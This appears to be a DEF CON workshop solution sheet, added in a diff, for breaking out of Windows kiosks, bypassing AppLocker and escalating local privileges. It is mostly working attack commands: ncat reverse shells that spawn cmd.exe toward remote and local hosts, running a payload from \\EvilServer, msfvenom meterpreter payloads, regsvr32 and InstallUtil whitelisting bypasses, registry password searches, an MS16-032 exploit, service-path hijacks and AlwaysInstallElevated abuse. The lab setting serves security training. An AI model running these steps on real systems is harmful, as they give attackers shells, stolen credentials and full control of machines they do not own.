@@ -1,0 +1,197 @@
+========================================================[Got Shell]
+
+
+1) Restricted1
+
+Breaking out:
+a) Right-click on Start button -> File Explorer or
+b) Windows Button -> type name of program you want to execute
+
+Running whoami:
+a) ftp.exe -> !whoami
+b) powershell -> whoami
+c) powershell_ise -> whoami
+d) batch script -> open notepad, type whoami > whoami.txt, run script
+
+
+2) Restricted2
+- Can only run notepad.exe
+
+Solutions:
+a) Copy ftp.exe to desktop -> rename to notepad.exe -> !whoami
+b) Copy cmd.exe to desktop -> rename to notepad.exe -> whoami
+c) Copy custom shell (ex. React OS) to desktop -> rename to notepad.exe -> whoami
+
+
+3) Kiosk 1
+- Aka the worst kiosk ever! The main challenge here is getting an explorer window, from there it is trivial to execute anything.
+
+Solutions:
+a) Sticky Keys: Press Shift 5x -> Press on Link in the popup window
+b) Task Manager: CTRL+SHIFT+ESC -> File -> Run New Task
+c) Print: Right-click anywhere -> Print -> Find Printer
+d) Open new tab -> Right-Click&Translate with Bing -> Or press F1
+	—- file:///C:/Windows/system32/cmd.exe
+e) Developer Tools: Press F12 -> Performance Tab -> Press on 3rd icon "Importing Profile Session"
+f) Open menu: Press CTRL+O -> Press Browse
+
+
+4) Kiosk 2
+- Uses Assigned access to expose a single Windows application to the user. Pretty decent lockdown, lots of mitigations in place, Microsoft made a concerted effort to prevent breakout. However, one thing was overlooked..
+
+Solution:
+a) Possible to mount UNC path. Even though visibility is restricted to folders, it is possible to execute binaries even with arguments.
+	—- \\EvilServer\Share\Payload.exe
+	—- \\127.0.0.1\C$\DefCon-Tools\Tools\ncat.exe -nv 192.168.187.1 443 -e C:\Windows\System32\cmd.exe
+
+
+5) AppLocker 1
+- Default rules & blocks powershell, cmd, rundll32. This user illustrates AppLocker configuration failures.
+
+Solutions:
+a) powershell_ise is not blocked.
+b) User has a folder which is exempt from AppLocker Policy
+	—- (Get-AppLockerPolicy -Local).RuleCollections
+	—- Get-ChildItem -Path HKLM:Software\Policies\Microsoft\Windows\SrpV2 -Recurse
+	—- reg query HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\SrpV2\Exe\560d03c2-b277-4331-8c59-bc7d4eb08359
+
+
+6) AppLocker 2
+- Default rules & blocks powershell, powershell_ise, cmd. This user illustrates common AppLocker/SRP bypasses by leveraging trusted binaries.
+
+Solutions:
+a) Classic rundll32
+	—- C:\Windows\System32\rundll32.exe C:\DefCon-Tools\SRP\Alternatives\cmd.dll,WhatEver
+b) regsvr32
+	1) SCT Execution
+		Reading Material:
+		- http://en.wooyun.io/2016/04/23/Use_SCT_to_Bypass_Application_Whitelisting_Protection.html
+		- https://gist.github.com/subTee/24c7d8e1ff0f5602092f58cbb3f7d302
+
+		Example:
+		- C:\Windows\System32\regsvr32.exe /u /s /i:"C:\DefCon-Tools\SRP\SubTee\Regsvr32-notepad.sct" scrobj.dll
+
+	2) DLL Execution
+		Reading Material:
+		- http://subt0x10.blogspot.com/2016/06/what-you-probably-didnt-know-about.html
+
+		Example:
+		- cmd.dll (ReactOS)
+		—- C:\Windows\System32\regsvr32.exe "C:\DefCon-Tools\SRP\Alternatives\cmd.dll"
+		- custom dll (with limitations)
+		—- C:\Windows\System32\regsvr32.exe C:\DefCon-Tools\SRP\SubTee\Resvr32-CalcNotepad.dll
+		—- C:\Windows\System32\regsvr32.exe /u C:\DefCon-Tools\SRP\SubTee\Resvr32-CalcNotepad.dll
+
+		- custom dll shellcode
+		—- Visual Studio project -> C:\DefCon-Tools\SRP\SubTee\Regsvr32-DLL-ShellCode
+		—- msfvenom -p windows/meterpreter/reverse_tcp LHOST='192.168.187.132' -f csharp
+c) InstallUtil
+	1) SubTee POC
+		Reading Material:
+		- http://subt0x10.blogspot.com/2015/08/application-whitelisting-bypasses-101.html
+		- https://gist.github.com/subTee/408d980d88515a539672
+
+		Example:
+		- msfvenom -p windows/meterpreter/reverse_tcp LHOST='192.168.187.132' -f csharp
+		- C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe  /unsafe /platform:x86 /out:”C:\DefCon-Tools\SRP\SubTee\InstallUtil-ShellCode.exe” ”C:\DefCon-Tools\SRP\SubTee\InstallUtil-ShellCode.cs”
+		- C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U ”C:\DefCon-Tools\SRP\SubTee\InstallUtil-ShellCode.exe”
+
+	2) p0wnedshell
+		Reading Material:
+		- https://github.com/Cn33liz/p0wnedShell
+
+		Example:
+		- (compile) C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /unsafe /reference:"C:\DefCon-Tools\SRP\SubTee\p0wnedShell\System.Management.Automation.dll" /reference:System.IO.Compression.dll /win32icon:"C:\DefCon-Tools\SRP\SubTee\p0wnedShell\p0wnedShell.ico" /out:"C:\DefCon-Tools\SRP\SubTee\p0wnedShell\p0wnedShellx64.exe" /platform:x64 "C:\DefCon-Tools\SRP\SubTee\p0wnedShell\*.cs"
+		- (execute) C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U "C:\DefCon-Tools\SRP\SubTee\p0wnedShell\p0wnedShellx64.exe"
+
+
+========================================================[Got SYSTEM]
+
+
+1) Registry Password
+    -- reg query HKLM /f password /t REG_SZ /s > HKLM.txt
+	-- Search results!
+	
+2) Missing Patches
+    -- Search for missing patches with "Parse-Bulettin.ps1"
+	—- wmic qfe Get HotFixID > C:\DefCon-Tools\Patches\patches.txt
+	—- . .\Parse-Bulletin
+	—- . C:\DefCon-Tools\Patches\Parse-Bulletin.ps1; Parse-Bulletin -BulletinCSV C:\DefCon-Tools\Patches\BulletinSearch.csv -QFE C:\DefCon-Tools\Patches\patches.txt -OSVersion "Windows 10 Version 1511 for x64-based Systems"
+	-- MS16-032 patch is not installed
+	-- . C:\DefCon-Tools\Patches\Invoke-MS16-032.ps1 -> Invoke-MS16-032 -> SYSTEM
+	
+3) Unattended Installs
+    -- cmd: dir C:\*unattend.xml /s
+	-- powershell: Get-ChildItem -Path C:\ -Filter unattend.xml -Recurse -ErrorAction 'silentlycontinue'
+	-- Search results!
+
+4) Services - services.msc
+a) Unquoted Service Paths - vulnService1
+    -- C:\DefCon-Tools\Tools\accesschk.exe -dvq "C:\Defcon\Vuln Folder 1" -> No Access!
+    -- Check unquoted:
+        -- cmd: wmic service get name,displayname,pathname,startmode |findstr /i "auto" |findstr /i /v "c:\windows\\" |findstr /i /v """
+        -- powershell: gwmi win32_service | ?{$_} | where {($_.pathname -ne $null) -and ($_.pathname.trim() -ne "")} | where {-not $_.pathname.StartsWith("`"")} | where {($_.pathname.Substring(0, $_.pathname.IndexOf(".exe") + 4)) -match ".* .*"}
+	    -- GUI: check services (services.msc) : vulnService1 -> no quotes and has spaces
+    -- Copy admin.exe in “C:\Defcon\”
+	-- Rename admin.exe to Vuln.exe
+	-- Restart machine
+	-- net users lowpriv -> in Administrators
+    -- remove lowpriv from Administrators (net localgroup Administrators lowpriv /delete)
+
+b) Weak Folder Permissions
+	-- cannot try Unquoted Service Path attack on vulnFolder2
+	-- check services (services.msc) vulnService2 -> Path to executable : C:\Defcon\VulnFolder2\anything.exe
+    -- C:\DefCon-Tools\Tools\accesschk.exe -dqv "C:\Defcon\VulnFolder2" -> Replace Binary?
+	    -- can create files in vulnFolder2 (unlike 1 and 3)
+	-- cannot delete but we can rename !
+		-- rename binary to something else
+		-- copy admin.exe in the folder and rename it to anything.exe
+	-- restart machine
+	-- net users lowpriv -> in Administrators
+    -- remove lowpriv from Administrators (net localgroup Administrators lowpriv /delete)
+
+c) Weak Service Permissions
+	-- cannot do the previous 2 attacks : no spaces + don't have permissions on the Folder
+    -- C:\DefCon-Tools\Tools\accesschk.exe -dqv "C:\Defcon\VulnFolder3" -> No Access!
+	-- sc qc vulnService3
+	-- Check Permissions:
+	    -- services.msc vulnService3 -> Can be started/stopped/modified + runs as LocalSystem
+        -- C:\DefCon-Tools\Tools\accesschk.exe -ucqv vulnService3
+	-- Stop the service
+	-- In cmd : sc config vulnService3 binpath= "C:\DefCon-Tools\Tools\ncat.exe -nv 127.0.0.1 1337 -e C:\Windows\System32\cmd.exe"
+	-- Start service
+	-- net users lowpriv -> in Administrators
+    -- remove lowpriv from Administrators (net localgroup Administrators lowpriv /delete)
+	
+5) Scheduled Task
+	-- View FTP_Backup scheduled task:
+	-- CMD : schtasks /query /v /fo list /tn "\Microsoft\Windows Defender\FTP_Backup"
+	-- GUI : Task Scheduler (Local) -> Task Scheduler Library -> Microsoft -> Windows Defender -> FTP_Backup
+	-- It executes ftp.exe at 12.34pm which is located in C:\Backup
+	-- !! RUNS AS SYSTEM & WRITEABLE FOLDER !!
+	-- Copy 1337.exe to C:\Backup and rename it to ftp.exe
+	-- Run normally -> lowpriv :(
+		-— C:\DefCon-Tools\Tools\ncat.exe -nv 127.0.0.1 1337
+	-- Now we wait for 12:34pm :)
+		—- C:\DefCon-Tools\Tools\ncat.exe -nv 127.0.0.1 1337
+	-- Note : Need admin privs to change Date & Time but not to change Time Zone
+	-- Go to admin and change time to 12:33pm
+	-- 6 .. 5 .. 4 .. 3 .. 2 .. 1 .. 12:34pm -> SYSTEM
+	
+6) AlwaysInstallElevated
+    -- Group Policy Hierarchy Local vs Domain
+	-- Check if AlwaysInstallElevated is set: 
+		-- reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
+		-- reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer
+	-- We can't run admin.exe but we can package it in an msi to install:
+		-- start with bat file : net localgroup Administrators lowpriv /add
+		-- Bat-to-exe-Converter (check Inivisble Application) -> Compile
+		-- Advanced Installer:
+			-- Import -> MSI from Exe(s)
+			-- Silent Installation
+			-- Leave the Programs and Features
+				-- else we can't uninstall it so if an admin removes us from being admins now we can uninstall the program and reinstall it
+			-- Build
+			-- Execute
+			-- net users lowpriv -> in Administrators
+			-- If someone removes us from admin, we can't install the program again -> remove from Program Files and Reinstall it
